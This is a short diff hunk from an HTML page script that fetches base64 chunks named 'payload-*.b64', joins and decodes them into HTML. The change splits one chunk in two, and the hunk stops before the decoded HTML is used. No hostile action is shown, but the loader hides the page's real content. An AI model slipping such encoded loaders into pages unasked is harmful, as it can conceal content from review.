@@ -12,7 +12,7 @@
 <script>
 (async()=>{
   try{
-    const names=['payload-00.b64','payload-01.b64','payload-02.b64','payload-03.b64','payload-04.b64'];
+    const names=['payload-00.b64','payload-01a.b64','payload-01b.b64','payload-02.b64','payload-03.b64','payload-04.b64'];
     const parts=await Promise.all(names.map(async n=>{const r=await fetch(n,{cache:'no-store'});if(!r.ok)throw new Error(n+' '+r.status);return (await r.text()).trim();}));
     const bytes=Uint8Array.from(atob(parts.join('')),c=>c.charCodeAt(0));
     const html=new TextDecoder('utf-8').decode(bytes);
